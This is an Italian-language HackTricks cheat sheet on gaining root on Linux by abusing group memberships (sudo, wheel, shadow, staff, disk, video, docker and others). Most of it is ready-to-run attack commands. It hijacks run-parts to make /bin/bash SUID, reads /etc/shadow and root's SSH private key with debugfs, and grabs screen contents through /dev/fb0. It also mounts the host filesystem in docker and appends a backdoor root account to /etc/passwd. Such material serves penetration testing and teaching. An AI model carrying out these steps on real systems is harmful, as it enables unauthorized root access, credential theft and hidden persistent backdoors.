# Gruppi Interessanti - Linux Privesc

<details>

<summary><strong>Impara l'hacking su AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Esperto Red Team AWS di HackTricks)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata in HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PIANI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**La Famiglia PEASS**](https://opensea.io/collection/the-peass-family), la nostra collezione di [**NFT esclusivi**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR a** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos di github.

</details>

## Gruppi Sudo/Admin

### **PE - Metodo 1**

**A volte**, **per impostazione predefinita (o perché alcuni software ne hanno bisogno)** all'interno del file **/etc/sudoers** è possibile trovare alcune di queste righe:
```bash
# Allow members of group sudo to execute any command
%sudo	ALL=(ALL:ALL) ALL

# Allow members of group admin to execute any command
%admin 	ALL=(ALL:ALL) ALL
```
Questo significa che **qualsiasi utente che appartiene al gruppo sudo o admin può eseguire qualsiasi comando come sudo**.

Se questo è il caso, per **diventare root puoi semplicemente eseguire**:
```
sudo su
```
### PE - Metodo 2

Trova tutti i binari suid e controlla se c'è il binario **Pkexec**:
```bash
find / -perm -4000 2>/dev/null
```
Se trovi che il binario **pkexec è un binario SUID** e appartieni a **sudo** o **admin**, probabilmente potresti eseguire binari come sudo utilizzando `pkexec`.\
Questo perché di solito questi sono i gruppi all'interno della **policy polkit**. Questa policy identifica fondamentalmente quali gruppi possono utilizzare `pkexec`. Controllalo con:
```bash
cat /etc/polkit-1/localauthority.conf.d/*
```
Lì troverai quali gruppi sono autorizzati ad eseguire **pkexec** e **per impostazione predefinita** in alcune distribuzioni Linux i gruppi **sudo** e **admin** appaiono.

Per **diventare root puoi eseguire**:
```bash
pkexec "/bin/sh" #You will be prompted for your user password
```
Se provi ad eseguire **pkexec** e ottieni questo **errore**:
```bash
polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freedesktop.PolicyKit1.Error.Failed: No session for cookie
==== AUTHENTICATION FAILED ===
Error executing command as another user: Not authorized
```
**Non è perché non hai le autorizzazioni ma perché non sei connesso senza una GUI**. E c'è un modo per aggirare questo problema qui: [https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903). Hai bisogno di **2 sessioni ssh diverse**:

{% code title="session1" %}
```bash
echo $$ #Step1: Get current PID
pkexec "/bin/bash" #Step 3, execute pkexec
#Step 5, if correctly authenticate, you will have a root session
```
{% endcode %}

{% code title="session2" %}
```bash
pkttyagent --process <PID of session1> #Step 2, attach pkttyagent to session1
#Step 4, you will be asked in this session to authenticate to pkexec
```
{% endcode %}

## Gruppo Wheel

**A volte**, **per impostazione predefinita** all'interno del file **/etc/sudoers** è possibile trovare questa riga:
```
%wheel	ALL=(ALL:ALL) ALL
```
Questo significa che **qualsiasi utente che appartiene al gruppo wheel può eseguire qualsiasi cosa come sudo**.

Se questo è il caso, per **diventare root puoi semplicemente eseguire**:
```
sudo su
```
## Gruppo Shadow

Gli utenti del **gruppo shadow** possono **leggere** il file **/etc/shadow**:
```
-rw-r----- 1 root shadow 1824 Apr 26 19:10 /etc/shadow
```
Quindi, leggi il file e cerca di **decifrare alcuni hash**.

## Gruppo Staff

**staff**: Consente agli utenti di aggiungere modifiche locali al sistema (`/usr/local`) senza necessità di privilegi di root (nota che gli eseguibili in `/usr/local/bin` sono nel PATH di qualsiasi utente e possono "sovrascrivere" gli eseguibili in `/bin` e `/usr/bin` con lo stesso nome). Confronta con il gruppo "adm", che è più legato al monitoraggio/sicurezza. [\[fonte\]](https://wiki.debian.org/SystemGroups)

Nelle distribuzioni debian, la variabile `$PATH` mostra che `/usr/local/` verrà eseguito con la massima priorità, che tu sia un utente privilegiato o meno.
```bash
$ echo $PATH
/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games

# echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```
Se riusciamo a dirottare alcuni programmi in `/usr/local`, possiamo facilmente ottenere i permessi di root.

Dirottare il programma `run-parts` è un modo facile per ottenere i permessi di root, poiché la maggior parte dei programmi eseguirà un `run-parts` come (crontab, quando si effettua il login ssh).
```bash
$ cat /etc/crontab | grep run-parts
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }
47 6    * * 7   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
52 6    1 * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }
```
o Quando viene effettuato un nuovo accesso alla sessione ssh.
```bash
$ pspy64
2024/02/01 22:02:08 CMD: UID=0     PID=1      | init [2]
2024/02/01 22:02:10 CMD: UID=0     PID=17883  | sshd: [accepted]
2024/02/01 22:02:10 CMD: UID=0     PID=17884  | sshd: [accepted]
2024/02/01 22:02:14 CMD: UID=0     PID=17886  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17887  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17888  | run-parts --lsbsysinit /etc/update-motd.d
2024/02/01 22:02:14 CMD: UID=0     PID=17889  | uname -rnsom
2024/02/01 22:02:14 CMD: UID=0     PID=17890  | sshd: mane [priv]
2024/02/01 22:02:15 CMD: UID=0     PID=17891  | -bash
```
**Sfruttare**
```bash
# 0x1 Add a run-parts script in /usr/local/bin/
$ vi /usr/local/bin/run-parts
#! /bin/bash
chmod 4777 /bin/bash

# 0x2 Don't forget to add a execute permission
$ chmod +x /usr/local/bin/run-parts

# 0x3 start a new ssh sesstion to trigger the run-parts program

# 0x4 check premission for `u+s`
$ ls -la /bin/bash
-rwsrwxrwx 1 root root 1099016 May 15  2017 /bin/bash

# 0x5 root it
$ /bin/bash -p
```
## Gruppo Disco

Questa privilegio è quasi **equivalente all'accesso di root** poiché consente di accedere a tutti i dati all'interno della macchina.

File: `/dev/sd[a-z][1-9]`
```bash
df -h #Find where "/" is mounted
debugfs /dev/sda1
debugfs: cd /root
debugfs: ls
debugfs: cat /root/.ssh/id_rsa
debugfs: cat /etc/shadow
```
Nota che utilizzando debugfs puoi anche **scrivere file**. Ad esempio, per copiare `/tmp/asd1.txt` in `/tmp/asd2.txt` puoi fare:
```bash
debugfs -w /dev/sda1
debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
```
Tuttavia, se provi a **scrivere file di proprietà di root** (come `/etc/shadow` o `/etc/passwd`) otterrai un errore di "**Permesso negato**".

## Gruppo Video

Utilizzando il comando `w` puoi trovare **chi è collegato al sistema** e mostrerà un output simile al seguente:
```bash
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
yossi    tty1                      22:16    5:13m  0.05s  0.04s -bash
moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
```
Il **tty1** significa che l'utente **yossi è connesso fisicamente** a un terminale sulla macchina.

Il gruppo **video** ha accesso per visualizzare l'output dello schermo. Fondamentalmente puoi osservare gli schermi. Per farlo è necessario **acquisire l'immagine corrente sullo schermo** in formato grezzo e ottenere la risoluzione che lo schermo sta utilizzando. I dati dello schermo possono essere salvati in `/dev/fb0` e potresti trovare la risoluzione di questo schermo su `/sys/class/graphics/fb0/virtual_size`
```bash
cat /dev/fb0 > /tmp/screen.raw
cat /sys/class/graphics/fb0/virtual_size
```
Per **aprire** l'**immagine grezza** puoi utilizzare **GIMP**, selezionare il file \*\*`screen.raw` \*\* e selezionare come tipo di file **Dati immagine grezzi**:

![](<../../../.gitbook/assets/image (463).png>)

Successivamente, modifica la larghezza e l'altezza con quelle utilizzate sullo schermo e controlla i diversi Tipi di Immagine (e seleziona quello che mostra meglio lo schermo):

![](<../../../.gitbook/assets/image (317).png>)

## Gruppo Root

Sembra che per impostazione predefinita i **membri del gruppo root** potrebbero avere accesso per **modificare** alcuni file di configurazione dei **servizi** o alcuni file di **librerie** o **altre cose interessanti** che potrebbero essere utilizzate per l'escalation dei privilegi...

**Verifica quali file possono essere modificati dai membri di root**:
```bash
find / -group root -perm -g=w 2>/dev/null
```
## Gruppo Docker

È possibile **montare il filesystem radice della macchina host su un volume dell'istanza**, in modo che quando l'istanza viene avviata carichi immediatamente un `chroot` in quel volume. Questo ti dà effettivamente i permessi di root sulla macchina.
```bash
docker image #Get images from the docker service

#Get a shell inside a docker container with access as root to the filesystem
docker run -it --rm -v /:/mnt <imagename> chroot /mnt bash
#If you want full access from the host, create a backdoor in the passwd file
echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /etc/passwd

#Ifyou just want filesystem and network access you can startthe following container:
docker run --rm -it --pid=host --net=host --privileged -v /:/mnt <imagename> chroot /mnt bashbash
```
Finalmente, se non ti piace nessuna delle suggerimenti precedenti, o se non stanno funzionando per qualche motivo (firewall dell'API di Docker?), potresti sempre provare a **eseguire un container privilegiato ed evadere da esso** come spiegato qui:

{% content-ref url="../docker-security/" %}
[docker-security](../docker-security/)
{% endcontent-ref %}

Se hai le autorizzazioni di scrittura sul socket di Docker leggi [**questo post su come ottenere privilegi abusando del socket di Docker**](../#writable-docker-socket)**.**

{% embed url="https://github.com/KrustyHack/docker-privilege-escalation" %}

{% embed url="https://fosterelli.co/privilege-escalation-via-docker.html" %}

## Gruppo lxc/lxd

{% content-ref url="./" %}
[.](./)
{% endcontent-ref %}

## Gruppo Adm

Di solito i **membri** del gruppo **`adm`** hanno autorizzazioni per **leggere i file di log** situati dentro _/var/log/_.\
Pertanto, se hai compromesso un utente all'interno di questo gruppo dovresti sicuramente dare un'**occhiata ai log**.

## Gruppo Auth

Dentro OpenBSD il gruppo **auth** di solito può scrivere nelle cartelle _**/etc/skey**_ e _**/var/db/yubikey**_ se vengono utilizzate.\
Queste autorizzazioni possono essere sfruttate con l'exploit seguente per **escalare i privilegi** a root: [https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot](https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot)

<details>

<summary><strong>Impara l'hacking su AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata in HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PIANI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di [**NFT esclusivi**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR a** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
